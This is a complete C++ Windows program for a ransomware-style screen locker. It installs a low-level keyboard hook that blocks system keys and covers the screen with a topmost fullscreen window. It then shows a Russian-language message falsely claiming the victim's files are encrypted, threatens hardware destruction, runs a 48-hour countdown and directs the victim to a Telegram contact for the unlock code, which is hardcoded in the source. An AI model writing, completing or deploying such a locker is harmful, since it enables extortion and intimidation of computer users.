#include <windows.h>
#include <string>
#include <vector>

const std::wstring PASSWORD = L"29042011";
std::wstring input_text = L"";
bool is_bsod = false;
DWORD start_time = 0;
int time_left = 48 * 60 * 60;
DWORD last_timer_tick = 0;
bool show_error = false;
DWORD error_time = 0;
std::wstring pc_name = L"DESKTOP-12345";

HHOOK hKeyboardHook;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB || p->vkCode == VK_ESCAPE) return 1;
        if (GetAsyncKeyState(VK_MENU) & 0x8000) return 1; 
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) return 1; 
        if (p->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; 
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CREATE:
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        SetTimer(hwnd, 1, 100, NULL); 
        {
            wchar_t buf[256];
            DWORD size = 256;
            GetComputerNameW(buf, &size);
            pc_name = buf;
        }
        start_time = GetTickCount();
        last_timer_tick = GetTickCount();
        return 0;

    case WM_TIMER:
        if (!is_bsod && GetTickCount() - start_time > 5000) {
            is_bsod = true;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        if (is_bsod && GetTickCount() - last_timer_tick >= 1000) {
            if (time_left > 0) time_left--;
            last_timer_tick = GetTickCount();
            InvalidateRect(hwnd, NULL, TRUE);
        }
        if (show_error && GetTickCount() - error_time > 3000) {
            show_error = false;
            InvalidateRect(hwnd, NULL, TRUE);
        }
        return 0;

    case WM_CHAR:
        if (is_bsod) {
            if (wp == VK_BACK) {
                if (!input_text.empty()) input_text.pop_back();
            } else if (wp == VK_RETURN) {
                if (input_text == PASSWORD) {
                    PostQuitMessage(0);
                } else {
                    input_text.clear();
                    show_error = true;
                    error_time = GetTickCount();
                }
            } else if (wp >= 32 && wp <= 126 && input_text.length() < 15) {
                input_text += (wchar_t)wp;
            }
            InvalidateRect(hwnd, NULL, TRUE);
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);
        
        if (!is_bsod) {
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
            RECT redRect = {0, rect.bottom / 4, rect.right, rect.bottom * 3 / 4};
            HBRUSH redBrush = CreateSolidBrush(RGB(139, 0, 0));
            FillRect(hdc, &redRect, redBrush);
            DeleteObject(redBrush);
            
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(255, 255, 255));
            HFONT font = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(hdc, font);
            
            const wchar_t* art1 = L"         .:::.         \n       .:::::::.       \n      :::::::::::      \n     :::::::::::::     \n    :::::::::::::::    \n   :::::::::::::::::   \n  :::::::::::::::::::  \n ::::::::::::::::::::: \n:::::::::::::::::::::::";
            DrawTextW(hdc, art1, -1, &redRect, DT_CENTER | DT_VCENTER);
            
            DeleteObject(font);
        } else {
            HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 170));
            FillRect(hdc, &rect, blueBrush);
            DeleteObject(blueBrush);
            
            SetBkMode(hdc, TRANSPARENT);
            HFONT font = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
            SelectObject(hdc, font);

            RECT whiteRect = {200, 100, 800, 130};
            HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(hdc, &whiteRect, whiteBrush);
            DeleteObject(whiteBrush);
            SetTextColor(hdc, RGB(0, 0, 0));
            DrawTextW(hdc, L" Ваши файлы зашифрованы! ", -1, &whiteRect, DT_CENTER | DT_VCENTER);
            
            SetTextColor(hdc, RGB(255, 255, 255));
            RECT textRect = {200, 150, 800, 400};
            const wchar_t* bsod_text = L"Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер\nзаблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской\nгруппировкой. Любые действия, связанные с попыткой обмануть систему,\nнанесут непоправимый вред вашему компьютеру и приведут к потере всех\nважных данных без возможности восстановления.\nБлокировку главный загрузчик материнки будет снесён, будет подана\nрекурсивная нагрузка на ваш процессор, что приведет к его неисправности.\nУ вас есть 48 часов с момента запуска чтобы ввести код,\nчто бы получить код, напиши               @opka8       (Telegram)";
            DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
            
            RECT inputRect = {200, 410, 800, 435};
            HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
            FillRect(hdc, &inputRect, inputBrush);
            DeleteObject(inputBrush);
            SetTextColor(hdc, RGB(0, 0, 0));
            std::wstring display = L"Введите код разблокировки: " + input_text;
            DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

            SetTextColor(hdc, RGB(255, 255, 255));
            RECT bottomRect = {200, 650, 800, 680};
            std::wstring bottom = L"Current PC: " + pc_name;
            DrawTextW(hdc, bottom.c_str(), -1, &bottomRect, DT_LEFT);
            
            int hrs = time_left / 3600;
            int mins = (time_left % 3600) / 60;
            int secs = time_left % 60;
            wchar_t timer_buf[100];
            swprintf_s(timer_buf, L"ОСТАЛОСЬ ВРЕМЕНИ: %02d:%02d:%02d", hrs, mins, secs);
            SetTextColor(hdc, RGB(0, 255, 0));
            RECT timerRect = {200, 680, 800, 710};
            DrawTextW(hdc, timer_buf, -1, &timerRect, DT_LEFT);

            if (show_error) {
                RECT errRect = {400, 300, 900, 400};
                HBRUSH redBrush = CreateSolidBrush(RGB(204, 0, 0));
                FillRect(hdc, &errRect, redBrush);
                DeleteObject(redBrush);
                SetTextColor(hdc, RGB(255, 255, 255));
                DrawTextW(hdc, L"Замечена и остановлена попытка\nобмануть систему!", -1, &errRect, DT_CENTER | DT_VCENTER);
            }
            DeleteObject(font);
        }
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_DESTROY:
        UnhookWindowsHookEx(hKeyboardHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = L"LockerClass";
    RegisterClassW(&wc);
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"LockerClass", L"System", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInst, NULL);
    ShowWindow(hwnd, SW_SHOW);
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
